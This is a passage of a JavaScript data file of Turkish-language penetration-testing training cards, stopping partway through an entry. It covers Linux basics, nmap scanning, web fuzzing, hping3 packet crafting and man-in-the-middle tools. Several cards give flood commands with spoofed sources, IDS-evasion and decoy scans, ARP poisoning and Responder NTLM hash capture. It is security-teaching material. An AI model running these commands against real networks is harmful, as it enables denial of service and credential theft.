window.ACADEMY_COMMANDS = [
    {
        "id": 1,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "KULLANICI TESPİTİ",
        "title": "Şu An Hangi Kullanıcıyım? (whoami)",
        "desc": "Terminalde hangi yetkiyle çalıştığınızı gösterir. Sistemde normal kullanıcı mısınız yoksa en yetkili süper kullanıcı (root) musunuz hemen söyler.",
        "cmd": "whoami"
    },
    {
        "id": 2,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "KİMLİK & GRUPLAR",
        "title": "Kullanıcı Kimlik Numarası ve Grupları İnceleme (id)",
        "desc": "Kullanıcının UID (User ID), GID (Group ID) ve dahil olduğu güvenlik gruplarını (sudo, adm, kvm) listeler. Sudo hakkınız olup olmadığını anlamak için ilk bakılan komuttur.",
        "cmd": "id"
    },
    {
        "id": 3,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "KONUM TESPİTİ",
        "title": "Şu Anda Hangi Klasördeyim? (pwd - Print Working Directory)",
        "desc": "Terminalde nerede olduğunuzu asla kaybetmemeniz için tam dosya yolu konumunuzu (örneğin /home/Sunny) ekrana yazdırır.",
        "cmd": "pwd"
    },
    {
        "id": 4,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "DOSYA LİSTELEME",
        "title": "Gizli Dosyalar ve İzinlerle Birlikte Klasör İçeriğini Listeleme (ls -la)",
        "desc": "Nokta ile başlayan gizli sistem dosyaları dahil tüm dosyaları dosya izinleri (rwx), sahibi ve boyutu ile ayrıntılı tablo halinde döker.",
        "cmd": "ls -la"
    },
    {
        "id": 5,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "GÜVENLİK GÜNLÜĞÜ",
        "title": "Sistem Log Klasörüne Geçiş Yapma (cd /var/log)",
        "desc": "Linux işletim sistemindeki tüm kimlik doğrulama, hata ve ağ günlüklerinin saklandığı kritik log dizinine geçiş yapar.",
        "cmd": "cd /var/log"
    },
    {
        "id": 6,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "HESAP ANALİZİ",
        "title": "Sistemdeki Tüm Kullanıcı Hesaplarını Okuma (cat /etc/passwd)",
        "desc": "Linux'taki tüm kayıtlı yerel hesapları, varsayılan kabuklarını (bash, nologin) ve ev dizinlerini listeler. Şifreler burada tutulmaz.",
        "cmd": "cat /etc/passwd"
    },
    {
        "id": 7,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "HATA AYIKLAMA",
        "title": "Log Dosyasında 'error' Kelimesini Filtreleme (grep)",
        "desc": "Binlerce satırlık sistem günlüğü içinde yalnızca güvenlik veya çalışma hatalarını süzerek ekrana getirir.",
        "cmd": "grep -i 'error' /var/log/syslog"
    },
    {
        "id": 8,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "GÜVENLİ DİZİN",
        "title": "Yeni Güvenli Çalışma Dizinleri Oluşturma (mkdir -p)",
        "desc": "Siber testleriniz için hiyerarşik klasör yapısını tek seferde oluşturur.",
        "cmd": "mkdir -p /opt/tools/recon"
    },
    {
        "id": 9,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "İZİN YÖNETİMİ",
        "title": "SSH Özel Anahtarını Yalnızca Sahibine Okunur Kılma (chmod 600)",
        "desc": "Kritik güvenlik anahtarlarını diğer kullanıcıların okumasını engeller. SSH bunu zorunlu tutar; aksi halde anahtar reddedilir.",
        "cmd": "chmod 600 id_rsa"
    },
    {
        "id": 10,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "SAHİPLİK AYARI",
        "title": "Dosya Sahipliğini Güvenlik Yöneticisine Devretme (chown root:root)",
        "desc": "Dosyanın mülkiyetini kök kullanıcıya vererek standart kullanıcıların değiştirmesini engeller.",
        "cmd": "sudo chown root:root /etc/shadow"
    },
    {
        "id": 11,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "ÇEKİRDEK SÜRÜMÜ",
        "title": "İşletim Sistemi Çekirdeği ve Mimarisi Bilgisi (uname -a)",
        "desc": "Linux çekirdeğinin tam sürümünü gösterir. Bilinen Kernel exploit açıklarını (Dirty COW, Dirty Pipe vb.) tespit etmek için ilk bakılan komuttur.",
        "cmd": "uname -a"
    },
    {
        "id": 12,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "DİSK DOLULUĞU",
        "title": "Disk Alanını İnsan Tarafından Okunabilir Formatta Görme (df -h)",
        "desc": "Sunucu disklerinin doluluk oranını (GB cinsinden) gösterir. Dolu diskler log kaydını durdurarak güvenlik açığına sebep olabilir.",
        "cmd": "df -h"
    },
    {
        "id": 13,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "BELLEK KULLANIMI",
        "title": "Canlı RAM ve Takas Alanı Durumu (free -m)",
        "desc": "Sistemin kaç MB RAM kullandığını ve bellek taşması riski olup olmadığını anlık gösterir.",
        "cmd": "free -m"
    },
    {
        "id": 14,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "İŞLEM TAKİBİ",
        "title": "Çalışan Güvenlik Servisini ve İşlemleri Bulma (ps aux)",
        "desc": "Sistemde arka planda çalışan tüm uygulamaları, CPU/RAM tüketimlerini ve PID kimliklerini gösterir.",
        "cmd": "ps aux | grep dotnet"
    },
    {
        "id": 15,
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "AĞ ARAYÜZÜ",
        "title": "Ağ Kartlarının IP ve MAC Adreslerini Öğrenme (ip a)",
        "desc": "Bilgisayarın yerel ağdaki IP adresini (192.168.x.x) ve Loopback (127.0.0.1) durumunu detaylı gösterir.",
        "cmd": "ip a"
    },
    {
        "id": "15b",
        "category": "linux",
        "categoryName": "1. Linux Temelleri",
        "badge": "WHOIS & DNS KEŞFİ",
        "title": "Hedef Alan Adı Kayıt ve Sahiplik Bilgisi Sorgulama (whois)",
        "desc": "Hedef web sitesinin barındığı sunucuları, DNS kayıtlarını ve alan adı sahibini açık kaynaklardan sorgular.",
        "cmd": "whois lostfromlight.com"
    },
    {
        "id": 16,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "TÜM PORTLAR",
        "title": "Bilgisayardaki Tüm 65,535 Portu Tarama (nmap -p-)",
        "desc": "Hedefte hiçbir gölge servisin (Shadow IT) unutulmaması için 1'den 65.535'e kadar tüm TCP portlarını denetler.",
        "cmd": "nmap -p- 127.0.0.1"
    },
    {
        "id": 17,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "TEKİL PORT",
        "title": "Belirli Bir Portun (8080) Durumunu Kontrol Etme (nmap 8080/tcp)",
        "desc": "Yalnızca web proxy veya geliştirici portu olan 8080'in açık olup olmadığını ve servisin yanıt verip vermediğini test eder.",
        "cmd": "nmap 8080/tcp 127.0.0.1"
    },
    {
        "id": 18,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "HIZLI KEŞİF",
        "title": "En Yaygın 100 Portu Hızlıca Tarama (nmap -F)",
        "desc": "Zaman kısıtlıyken en kritik 100 portu 1 saniyeden kısa sürede tarayarak hızlı durum raporu sunar.",
        "cmd": "nmap -F 192.168.1.1"
    },
    {
        "id": 19,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "GİZLİ CİHAZ",
        "title": "Ping Korumalı Gizli Cihazları Taramaya Zorlama (nmap -Pn)",
        "desc": "Hedef güvenlik duvarı ping paketlerini engellese bile cihazın açık olduğunu varsayarak portları tarar.",
        "cmd": "nmap -Pn 192.168.1.1"
    },
    {
        "id": 20,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "VERSİYON TESPİTİ",
        "title": "Servis ve Tam Sürüm Numarasını Yakalama (nmap -sV)",
        "desc": "Açık olan portun arkasında hangi yazılımın (örn: Apache 2.4.49 veya Nginx 1.18) çalıştığını öğrenir.",
        "cmd": "nmap -sV -p 49152 192.168.1.1"
    },
    {
        "id": 21,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "PING SWEEP",
        "title": "Ağdaki Tüm Aktif Cihazları Listeleme (nmap -sn)",
        "desc": "Port taraması yapmadan sadece ping atarak ağdaki hangi IP adreslerinin açık olduğunu birkaç saniyede haritalandırır.",
        "cmd": "sudo nmap -sn 192.168.1.0/24"
    },
    {
        "id": 22,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "İŞLETİM SİSTEMİ",
        "title": "Hedef Cihazın İşletim Sistemini Tahmin Etme (nmap -O)",
        "desc": "TCP/IP yığınının tepkilerini (TTL değerleri vb.) analiz ederek hedef cihazın Windows mu Linux mu olduğunu deşifre eder.",
        "cmd": "sudo nmap -O 192.168.1.17"
    },
    {
        "id": 23,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "ÇOKLU PORT",
        "title": "Birden Fazla Özel Portun Servis Detayları (nmap -sV -p ...)",
        "desc": "Yalnızca ilgilenilen belirli servis portlarının parmak izini çıkarır.",
        "cmd": "sudo nmap -sV -p 5000,7000,7100,62078 192.168.1.17"
    },
    {
        "id": 24,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "GİZLİ & SESSİZ",
        "title": "Stealth SYN Taraması & IDS Atlatma (nmap -sS -T2)",
        "desc": "Bağlantıyı tamamlamadan (3-way handshake yapmadan) sadece kapıyı tıklar ve paketleri yavaş göndererek güvenlik duvarlarından gizlenir.",
        "cmd": "nmap -sS -T2 192.168.1.1"
    },
    {
        "id": 25,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "ZAFİYET MOTORU",
        "title": "NSE Motoru ile Zafiyet Veritabanı Taraması (nmap --script vuln)",
        "desc": "Hedef portlardaki servisleri Nmap'in geniş güvenlik açığı arşiviyle karşılaştırarak bilinen CVE açıklarını listeler.",
        "cmd": "nmap --script vuln 192.168.1.1"
    },
    {
        "id": 26,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "UDP SERVİSLERİ",
        "title": "UDP Portlarını Denetleme (nmap -sU)",
        "desc": "DNS (53), DHCP (67) ve SNMP (161) gibi TCP kullanmayan UDP tabanlı kritik servisleri tarar.",
        "cmd": "sudo nmap -sU -p 53,67,161 192.168.1.1"
    },
    {
        "id": 27,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "TAM DETAY",
        "title": "Agresif Hepsi Bir Arada Tarama (nmap -A)",
        "desc": "İşletim sistemi tespiti, sürüm tespiti, traceroute ve varsayılan script taramalarının tamamını tek komutta birleştirir.",
        "cmd": "nmap -A 192.168.1.1"
    },
    {
        "id": 28,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "EN ÖNEMLİ 20 PORT",
        "title": "Dünyanın En Çok Saldırı Alan 20 Portu (nmap --top-ports 20)",
        "desc": "İnternette en çok açık bırakılan 20 kritik servis portunu hızlıca denetler.",
        "cmd": "nmap --top-ports 20 127.0.0.1"
    },
    {
        "id": 29,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "SSL/TLS SERTİFİKA",
        "title": "Web Sunucusunun SSL Sertifikasını İnceleme (ssl-cert script)",
        "desc": "HTTPS sertifikasının süresini, kime ait olduğunu ve şifreleme algoritmasını ekrana döker.",
        "cmd": "nmap -p 443 --script ssl-cert 127.0.0.1"
    },
    {
        "id": 30,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "GÜVENLİK BAŞLIKLARI",
        "title": "HTTP Güvenlik Başlıklarını Nmap ile Okuma (http-headers)",
        "desc": "Hedef web sunucusunun HSTS, CSP ve X-Frame-Options başlıklarını döndürüp döndürmediğini kontrol eder.",
        "cmd": "nmap -p 80 --script http-headers 127.0.0.1"
    },
    {
        "id": 31,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "ANONİM FTP",
        "title": "FTP Sunucusunda Parolasız Giriş Kontrolü (ftp-anon)",
        "desc": "FTP portunda kullanıcı adı 'anonymous' ve boş parola ile içeri girilip girilemediğini test eder.",
        "cmd": "nmap -p 21 --script ftp-anon 192.168.1.1"
    },
    {
        "id": 32,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "SMB ETERNALBLUE",
        "title": "WannaCry / MS17-010 SMB Zafiyeti Taraması (smb-vuln-ms17-010)",
        "desc": "Fidye yazılımlarının kullandığı tarihi Windows dosya paylaşım açığının hedefte bulunup bulunmadığını test eder.",
        "cmd": "nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10"
    },
    {
        "id": 33,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "SAHTE IP (DECOY)",
        "title": "Gerçek IP'yi Sahte İstemciler Arasında Gizleme (nmap -D)",
        "desc": "Araya 10 adet rastgele sahte IP serpiştirerek hedef güvenlik duvarının gerçek saldırgan IP'sini tespit etmesini imkansızlaştırır.",
        "cmd": "nmap -D RND:10 192.168.1.1"
    },
    {
        "id": 34,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "ROTA İZLEME",
        "title": "Hedefe Giderken Hangi Yönlendiricilerden Geçildi? (--traceroute)",
        "desc": "Paketinizin hedefe ulaşana kadar geçtiği tüm ara santralleri ve ağ düğümlerini milisaniye cinsinden çizer.",
        "cmd": "nmap --traceroute 8.8.8.8"
    },
    {
        "id": 35,
        "category": "nmap",
        "categoryName": "2. Ağ & Nmap",
        "badge": "RAPOR KAYDI",
        "title": "Tarama Sonuçlarını Metin Dosyasına Kaydetme (-oN)",
        "desc": "Tarama raporunu daha sonra kurumsal sızma testi belgesi olarak sunabilmek için bir txt dosyasına kaydeder.",
        "cmd": "nmap -oN scan_results.txt 127.0.0.1"
    },
    {
        "id": 36,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "GİZLİ KLASÖRLER",
        "title": "Web Sitesindeki Gizli Dizinleri Bulma (Gobuster)",
        "desc": "Kelime listesi kullanarak web sitesinde unutulmuş /admin, /backup, /api ve /config gibi dizinleri ortaya çıkarır.",
        "cmd": "gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt"
    },
    {
        "id": 37,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "UZANTI TARAMASI",
        "title": "Yedek ve Veritabanı Dosyalarını Bulma (Gobuster -x)",
        "desc": "Dizinlerin yanında .php, .bak, .zip, .sql ve .txt uzantılı unutulan yedek dosyalarını da tarar.",
        "cmd": "gobuster dir -u http://127.0.0.1 -w common.txt -x php,bak,zip,sql,txt"
    },
    {
        "id": 38,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "ULTRA HIZLI FUZZER",
        "title": "Çok Yüksek Hızlı Asenkron Web Fuzzing (FFuf)",
        "desc": "Saniyede yüzlerce GET isteği göndererek sunucuda gizlenen veya hata döndüren her parametreyi tespit eder.",
        "cmd": "ffuf -u http://127.0.0.1/FUZZ -w /usr/share/wordlists/dirb/common.txt"
    },
    {
        "id": 39,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "DURUM FİLTRESİ",
        "title": "Yalnızca 200 OK ve 301 Yönlendirmeleri Gösterme (FFuf -mc)",
        "desc": "404 Not Found hatalarını gizleyip sadece gerçekten var olan geçerli sayfaları listeler.",
        "cmd": "ffuf -u http://127.0.0.1/FUZZ -w common.txt -mc 200,301"
    },
    {
        "id": 40,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "BEARER TOKEN FUZZ",
        "title": "API Yetkilendirme Başlığı Fuzzing (FFuf -H)",
        "desc": "HTTP başlığında farklı API token veya yetkilendirme parametrelerini deneyerek yetki aşımını test eder.",
        "cmd": "ffuf -w wordlist.txt -u http://127.0.0.1/api/profile -H \"Authorization: Bearer FUZZ\""
    },
    {
        "id": 41,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "KLASİK DİZİN TARAYICI",
        "title": "Standart Web İçerik Keşfi (Dirb)",
        "desc": "Klasik ve güvenilir web tarayıcı aracıyla sunucudaki kök klasörleri sırayla dener.",
        "cmd": "dirb http://192.168.1.1 /usr/share/wordlists/dirb/common.txt"
    },
    {
        "id": 42,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "GELİŞMİŞ FİLTRE",
        "title": "404 Kodlarını Gizleyen Renkli Fuzzer (Wfuzz)",
        "desc": "Hata sayfalarını eleyerek yalnızca gizli kalmış parametreleri ve değişkenleri ortaya çıkarır.",
        "cmd": "wfuzz -c -z file,common.txt --hc 404 http://127.0.0.1/FUZZ"
    },
    {
        "id": 43,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "WEB ZAFİYET TARAMASI",
        "title": "Web Sunucusu Yapılandırma ve Açık Taraması (Nikto)",
        "desc": "Sunucudaki tehlikeli varsayılan dosyaları, eski yazılım sürümlerini ve eksik HTTP başlıklarını tespit eder.",
        "cmd": "nikto -h 192.168.1.1"
    },
    {
        "id": 44,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "TEKNOLOJİ PARMAK İZİ",
        "title": "Web Sitesinin Kullandığı Altyapıyı Deşifre Etme (WhatWeb)",
        "desc": "Web sitesinin hangi CMS (WordPress, Joomla), programlama dili (ASP.NET, PHP) ve sunucuyu (Kestrel, Nginx) kullandığını anlar.",
        "cmd": "whatweb http://127.0.0.1"
    },
    {
        "id": 45,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "ALT ALAN ADI",
        "title": "Şirketin Gizli Alt Alan Adlarını Bulma (Sublist3r)",
        "desc": "Arama motorlarından ve DNS arşivlerinden faydalanarak dev.sirket.com veya test.sirket.com gibi gölge alan adlarını keşfeder.",
        "cmd": "sublist3r -d lfl.local"
    },
    {
        "id": 46,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "ÖZEL PARAMETRE",
        "title": "Gizli GET/POST Parametrelerini Keşfetme (Arjun)",
        "desc": "Web sayfalarında kod geliştiricilerin unuttuğu ?debug=true veya ?admin=1 gibi gizli parametreleri otomatik yakalar.",
        "cmd": "arjun -u http://127.0.0.1/api/search"
    },
    {
        "id": 47,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "TARAYICI ÖZETİ",
        "title": "Sadece Sunucu Başlıklarını Hızlıca Alma (curl -I)",
        "desc": "Web sayfasının içeriğini indirmeden sadece sunucu başlıklarını (Server, Date, Content-Type) çekerek hızlı inceleme yapar.",
        "cmd": "curl -I http://127.0.0.1"
    },
    {
        "id": 48,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "REKÜRSİF KEŞİF",
        "title": "Derinlemesine Dizin Ağacı Tarayıcı (Feroxbuster)",
        "desc": "Rust dilinde yazılmış modern araç; bulduğu her alt dizinin içine otomatik girerek derinlemesine tarama yapar.",
        "cmd": "feroxbuster -u http://127.0.0.1"
    },
    {
        "id": 49,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "WORDPRESS DENETİMİ",
        "title": "WordPress Eklenti ve Kullanıcı Taraması (WPScan)",
        "desc": "Hedef sitedeki güncellenmemiş güvensiz WordPress eklentilerini ve admin kullanıcı adlarını listeler.",
        "cmd": "wpscan --url http://127.0.0.1 --enumerate u,vp"
    },
    {
        "id": 50,
        "category": "web",
        "categoryName": "3. Web & Fuzzing",
        "badge": "ARŞİV BAĞLANTILARI",
        "title": "Geçmişte Açık Olan Web Adreslerini Çekme (waybackurls)",
        "desc": "Wayback Machine internet arşivini sorgulayarak sitenin yıllar önce yayında olan gizli linklerini bulur.",
        "cmd": "waybackurls target.com"
    },
    {
        "id": 51,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "SYN PAKET TESTİ",
        "title": "Manuel TCP SYN Paketiyle Port Açık mı Sorgulama (hping3 -S)",
        "desc": "Hedefe 1 adet ham TCP SYN paketi fırlatır. Karşıdan SYN-ACK dönerse port açıktır, RST dönerse kapalıdır.",
        "cmd": "sudo hping3 -S -p 80 -c 1 192.168.1.1"
    },
    {
        "id": 52,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "FIREWALL TESTİ",
        "title": "ACK Bayrağı ile Güvenlik Duvarı Tepkisini Ölçme (hping3 -A)",
        "desc": "Doğrudan ACK paketi göndererek güvenlik duvarının durum takipli (stateful) olup olmadığını analiz eder.",
        "cmd": "sudo hping3 -A -p 80 -c 1 192.168.1.1"
    },
    {
        "id": 53,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "ICMP TESTİ",
        "title": "Hedefe Özel ICMP Echo Paketi Yollama (hping3 -1)",
        "desc": "Standart ping programından farklı olarak paket boyutunu ve sıklığını kontrol edebileceğiniz ICMP paketi atar.",
        "cmd": "hping3 -1 127.0.0.1 -c 3"
    },
    {
        "id": 54,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "SSH PORT DENETİMİ",
        "title": "Belirli Porta Manuel SYN Paketi Yollama (hping3 -p 22)",
        "desc": "SSH portunun (22) bağlantı kabul etme hızını ve TTL paket düşüşünü test eder.",
        "cmd": "hping3 -S -p 22 127.0.0.1"
    },
    {
        "id": 55,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "DOS SİMÜLASYONU",
        "title": "Rastgele IP'lerle UDP Flood Saldırı Testi (hping3 --flood)",
        "desc": "Sahte kaynak IP adresleri üreterek güvenlik duvarının DDoS savunma mekanizmasını (Rate Limiting) test eder.",
        "cmd": "sudo hping3 --udp --flood --rand-source -p 80 192.168.1.1"
    },
    {
        "id": 56,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "SYN FLOOD",
        "title": "TCP SYN Flood Yük Testi (hping3 -S --flood)",
        "desc": "Sunucunun TCP bağlantı tablosunu doldurmaya çalışarak SYN Cookies savunmasının devrede olup olmadığını kontrol eder.",
        "cmd": "sudo hping3 -S -p 80 --flood 127.0.0.1"
    },
    {
        "id": 57,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "XMAS AĞ TARAMASI",
        "title": "FIN, URG ve PUSH Bayraklı Xmas Paketi (hping3 -F -P -U)",
        "desc": "TCP paketinde aynı anda olmaması gereken bayrakları yakarak eski tip filtreleri ve işletim sistemlerini ayırt eder.",
        "cmd": "sudo hping3 -F -P -U -p 80 127.0.0.1 -c 1"
    },
    {
        "id": 58,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "UDP PAKETİ",
        "title": "DNS Portuna Ham UDP Paketi Enjeksiyonu (hping3 -2)",
        "desc": "Hedefin 53 numaralı UDP portuna paket yollayarak ICMP Port Unreachable dönüp dönmediğini sınar.",
        "cmd": "sudo hping3 -2 -p 53 192.168.1.1 -c 2"
    },
    {
        "id": 59,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "BOZUK SAĞLAMA",
        "title": "Bozuk Checksum ile IDS Tespiti (hping3 --badcksum)",
        "desc": "Bozuk TCP sağlama toplamına sahip paket yollar; hedef paketleri çöpe atarken ara ağ cihazları paketi işliyorsa tespit edilir.",
        "cmd": "sudo hping3 -p 80 --badcksum 127.0.0.1 -c 1"
    },
    {
        "id": 60,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "ZAMAN DAMGASI",
        "title": "TCP Zaman Damgası ile Cihaz Uptime Tespiti (tcp-timestamp)",
        "desc": "Cihazın kaç gündür yeniden başlatılmadığını (uptime) tahmin etmek için TCP zaman damgası bayrağını kullanır.",
        "cmd": "sudo hping3 -p 80 --tcp-timestamp 127.0.0.1 -c 1"
    },
    {
        "id": 61,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "MODERN NPING",
        "title": "Çok Portlu Ağ Test Paketi Üreticisi (nping)",
        "desc": "Nmap ekibi tarafından geliştirilen modern paket aracıyla hem 80 hem 443'e aynı anda SYN gönderir.",
        "cmd": "sudo nping --tcp -p 80,443 --flags syn 127.0.0.1"
    },
    {
        "id": 62,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "YÜKSEK HIZLI PING",
        "title": "Tüm Ağ Bloğuna Paralel Hızlı Ping Taraması (fping)",
        "desc": "Tek tek beklemek yerine aynı anda tüm alt ağdaki 254 cihaza ping atarak açık cihazları 0.2 saniyede yakalar.",
        "cmd": "sudo fping -a -g 192.168.1.0/24"
    },
    {
        "id": 63,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "PORT TEPKİ SÜRESİ",
        "title": "TCP Port Gecikmesini Ölçme (tcpping)",
        "desc": "Web portunun bağlantı kabul etme gecikmesini milisaniye hassasiyetinde ölçer.",
        "cmd": "tcpping 127.0.0.1 80"
    },
    {
        "id": 64,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "ICMP FLOOD",
        "title": "Ping Boğma Simülasyonu (hping3 --icmp --flood)",
        "desc": "Ağ kartının ICMP paket işleme sınırını test eder. Modern sistemlerde ICMP Rate Limiting bunu engeller.",
        "cmd": "sudo hping3 --icmp --flood 127.0.0.1"
    },
    {
        "id": 65,
        "category": "packet",
        "categoryName": "4. Paket & Firewall",
        "badge": "ÖZEL PAKET MOTORU",
        "title": "Python ile Ham Paket İnşa Etme (Scapy)",
        "desc": "İstediğiniz TCP/IP bayrağını ve yükünü sıfırdan yazarak güvenlik açıklarını test edebileceğiniz Python ortamıdır.",
        "cmd": "sudo scapy"
    },
    {
        "id": 66,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "DİNLEME ÇERÇEVESİ",
        "title": "Ağ Analizi ve Dinleme Başlatma (Bettercap)",
        "desc": "Yerel ağ arayüzünde dinleme başlatır; yetkisiz şifresiz HTTP/FTP oturumlarını tespit etmek için kullanılır.",
        "cmd": "bettercap -iface lo"
    },
    {
        "id": 67,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "HAM PAKET YAKALAYICI",
        "title": "HTTP Trafiğini Canlı İzleme (tcpdump)",
        "desc": "Ağ kartından geçen paketleri ham olarak yakalar ve ekranda kaynak/hedef IP ile birlikte görüntüler.",
        "cmd": "sudo tcpdump -i eth0 -nn -s0 -v port 80"
    },
    {
        "id": 68,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "SYN BAYRAK YAKALAMA",
        "title": "Gelen Bağlantı Taleplerini Canlı Takip Etme (tcpdump SYN)",
        "desc": "Yalnızca yeni kurulan bağlantıların (SYN bayraklı) paketlerini filtreleyerek port taramalarını gerçek zamanlı yakalar.",
        "cmd": "sudo tcpdump -i eth0 \"tcp[tcpflags] & (tcp-syn) != 0\""
    },
    {
        "id": 69,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "TERMİNAL WIRESHARK",
        "title": "Wireshark Filtreleri ile Paket Yakalama (Tshark)",
        "desc": "Dünyaca ünlü Wireshark aracının terminal sürümüdür; GUI olmadan sunucularda derin paket analizi yapar.",
        "cmd": "tshark -i 1 -c 15"
    },
    {
        "id": 70,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "HTTP URL FİLTRESİ",
        "title": "Gidilen Web Sitelerini Ekrana Dökme (Tshark HTTP)",
        "desc": "Ağdaki şifresiz HTTP isteklerinin Host ve URI adreslerini ayıklayarak canlı listeler.",
        "cmd": "tshark -i 1 -Y \"http.request\" -T fields -e http.host -e http.request.uri"
    },
    {
        "id": 71,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "ARP ZEHİRLEME",
        "title": "ARP Önbellek Zehirleme Simülasyonu (arpspoof)",
        "desc": "Modem ile hedef cihaz arasına girerek trafiği kendi üzerinden yönlendirmeye çalışır. Dynamic ARP Inspection ile korunulur.",
        "cmd": "sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1"
    },
    {
        "id": 72,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "ETTERCAP ÇERÇEVESİ",
        "title": "Metin Modunda Ortadaki Adam Simülasyonu (Ettercap)",
        "desc": "Yerel ağdaki bağlantıları haritalandırarak şifrelenmemiş protokolleri denetler.",
        "cmd": "sudo ettercap -T -q -i eth0 // //"
    },
    {
        "id": 73,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "LLMNR YAKALAYICI",
        "title": "Windows İsim Çözümleme ve NTLM Özeti Yakalama (Responder)",
        "desc": "Yanlış yazılan ağ paylaşım isimlerine cevap vererek istemcinin NTLMv2 parola özetini toplar.",
        "cmd": "sudo responder -I eth0 -dwv"
    },
    {
        "id": 74,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "MAC ADRESİ DEĞİŞTİRME",
        "title": "Ağ Kartının MAC Adresini Rastgele Değiştirme (macchanger)",
        "desc": "Fiziksel donanım adresinizi gizleyerek ağ takip sistemlerinin cihazınızı tanımasını engeller.",
        "cmd": "sudo macchanger -r eth0"
    },
    {
        "id": 75,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "WIFI DİNLEME",
        "title": "Kablosuz Ağ Paketlerini Havada Dinleme (Airodump-ng)",
        "desc": "Kablosuz ağ kartını izleme (monitor) moduna alarak çevredeki Wi-Fi yayınlarını listeler.",
        "cmd": "sudo airodump-ng wlan0mon"
    },
    {
        "id": 76,
        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "TRAFİKTEKİ RESİMLER",
        "title": "Ağ Paketlerindeki Resimleri Yakalama (Driftnet)",
        "desc": "Şifrelenmemiş HTTP trafiğinden geçen tüm resimleri ve grafikleri anında ekranda gösterir.",
        "cmd": "sudo driftnet -i eth0"
    },
    {
        "id": 77,
